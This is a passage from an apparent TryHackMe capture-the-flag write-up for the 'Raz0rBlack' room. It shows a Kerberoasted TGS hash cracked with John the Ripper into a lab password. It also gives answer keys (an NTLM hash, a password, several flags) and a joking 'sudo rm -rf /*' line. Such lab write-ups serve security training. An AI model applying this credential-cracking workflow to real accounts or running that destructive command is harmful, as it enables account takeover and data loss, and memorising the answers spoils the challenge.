$krb5tgs$23$*xyan1d3$RAZ0RBLACK.THM$raz0rblack.thm/xyan1d3*$31f056e87f08a49c2d3917630c173fce$88b22e9cb7d59258855f68191dae57cc8b94413e65185e4d184300923070cb2cf811fef0445b77b4434ec1a9b38c1f99f547734d8fa6219f5d5fc29432d1ee99f2e6cb6137e4b12706a2d75468f50091f42a48fb6288f128697fc2ab388e91c6ca5fdebad9c09eee2a9e4a32b1588cb82154cca3864fa3ed72a836a06930eb79acc887ab1bbf04a06743f584e1ee544b180d032bd040b42eef9760fa18c0031f4be1425c0468a539a6f0bd90ea7e657e9f401102046d8830e39f52be8b4f2ce11595435bb66223a0da1c13fbad8f3f6ecb4e2f678b5ea40c220465d547dcd0274a675db6b0d304855b000bdf0a370c871af5d18342312f26f81d6ba7c42c9915889bff4e98c105311e1ef3464ef3d0f630bc8736549c68ba0624b8f9f9eedd9d323864fa0b3d70e1f807e90b931d47a2c8addaa3495723119b1996082f0e184a755739c160a8854e23007ade47171f7dc61776e622dd23133ec990fdd9555830d4b98751289cf2bd9d8800731b389722c48d24cf37bf652f80ca49d179997da0ca78692995cfcd85568545b185fd06e9052c15081b0007ea87f78f9e96dc72991385b36d2ddb21405796190431912768db5c6354586b3822418cecafd544841b7c283d9ec85462df4c74065b71162638aee5da49ef70a1387ff255c781ed8ee9f75d8ba96bd45f6160b3367c1f3ec5527b240272a3036f5919375704454de422b6648efce79f06a1317a35f87a297b0f366f653bcbb60209ff8da631190d9d200afa36dfdc63a2fc153edfc6a15b7ff9688989d3a3b8ed4bb88816aa33fdfb72bf8a70b6d51b5f59a027a3f1c134f64c092bbcef853713bdd955cd46e0dcc0cf49fc7d3e25014ec18f4468c88a6e6425d8b81a9f548e072f0767835fb80b7a196e06a551a0e62feb0fcecccd10bdca27130ef68aa93aa1cef3d5b411690c66db4dbee84f8e5efbbd142e5497c6c4d7f1b5b216754111d6b1bd0692c57707bddc051c8c5fd9bde1aeda682b3708a59d4d8343c833a295dd96662234637251394a3b6c8584f687f3843a94e7ef9baabde3305bac1824f9268bd38333b320c6ead83a231ebcead58179888df721391559297f6328e5f05a1e714301868c75a1597d0c44693b38f9f3df86f72d24665b8464320627fb868e997b9fabcc14d9558b6bc14d4d25bc89ab3899ef0a104f6a44a2245084ce008e8a125fd3326b0f420a60d6a92d8ae950f6b69b41bd37cc58f15fce3c4dfb39f5ae82a6796c3148f804ee3f0b62308cc8c97db07a8bc04f798d79c5e02983d20d375b6fcc59db8faf7276874529f82a2a0b83c25f8fabbb8c7b4130da01246e8d40de1b1afecc12b263a96083f31fd5cde6bbc753297059a4c47a449455fcc89ffd6c7e84eb26e0a66bbf867124aad78b685cd9eb01ec954fdfb3
:~#
```

```bash
~# john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
cyanide9amine5628 (?)
1g 0:00:00:16 DONE (2025-06-12 03:36) 0.06056g/s 537119p/s 537119c/s 537119C/s cybastean..cy2749454
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```



> 2.4. <em>What is Ljudmila's Hash?</em><br><a id='2.4'></a>
>> <strong><code>f220d3988deb3f516c73f40ee16c431d</code></strong><br>
<p></p>

<br>

> 2.5. <em>What is Ljudmila's Flag?</em><br><a id='2.5'></a>
>> <strong><code>THM{694362e877adef0d85a92e6d17551fe4}</code></strong><br>
<p></p>


<br>

> 2.6. <em>What is Xyan1d3's password?</em><br><a id='2.6'></a>
>> <strong><code>cyanide9amine5628</code></strong><br>
<p></p>

<br>

> 2.7. <em>What is Xyan1d3's Flag?</em><br><a id='2.7'></a>
>> <strong><code>THM{62ca7e0b901aa8f0b233cade0839b5bb}</code></strong><br>
<p></p>

<br>

> 2.8. <em>What is the root Flag?</em><br><a id='2.8'></a>
>> <strong><code>THM{1b4f46cc4fba46348273d18dc91da20d}</code></strong><br>
<p></p>

<br>

> 2.9. <em>What is Tyson's Flag?</em><br><a id='2.9'></a>
>> <strong><code>THM{5144f2c4107b7cab04916724e3749fb0}</code></strong><br>
<p></p>

<br>


> 2.11. <em>Did you like your cookie? Say Yes or I will do sudo rm -rf /* on your PC</em><br><a id='2.11'></a>
>> <strong><code>Yes</code></strong><br>
<p></p>


<br>
<br>

<h1 align="center">Room Completed</h1>
<br>
<p align="center"><img width="1000px" src="https://github.com/user-attachments/assets/65093b24-337a-4e7e-a462-4a4657073fb0"><br>
                  <img width="1000px" src="https://github.com/user-attachments/assets/7a3d72ad-ba9e-456e-af58-3f4efa10d8de"></p>

<h1 align="center"> My TryHackMe Journey</h1>
<br>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| June 12 2025      | 402      |     203rd    |      4ᵗʰ     |     548ᵗʰ   |    12nd    |  107,441 |    775    |     62    |

</div>

<p align="center"> Global All Time:  204ᵗʰ<br><br>
<img width="240px" src="https://github.com/user-attachments/assets/a0ef70c8-8b08-462e-9691-ca7dfd91da72"><br>
<img width="1000px" src="https://github.com/user-attachments/assets/1126b103-f455-4a38-82bc-b8a719977629"></p>

<p align="center"> Brazil All Time:    4ᵗʰ<br><br><img width="1000px" src="https://github.com/user-attachments/assets/3a428473-6772-42cc-9969-808c118672b35"></p>

<p align="center"> Global monthly:    548ᵗʰ<br><br><img width="1000px" src="https://github.com/user-attachments/assets/bb9fa32a-73a6-430b-9742-4708bdbc116c"> </p>

<p align="center"> Brazil monthly:    12nd<br><br><img width="1000px" src="https://github.com/user-attachments/assets/2f7aaa45-eeb5-410a-9b0d-8b92f37d78ed"> </p>

<h1 align="center">Thanks for coming!!!</h1>

<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p> 

<h1 align="center">Thank you</h1>
<p align="center"><a href="https://tryhackme.com/p/Xyan1d3">Xyan1d3</a> for investing your time and effort to develop this challenge so that I could sharpen my skills!</p> 

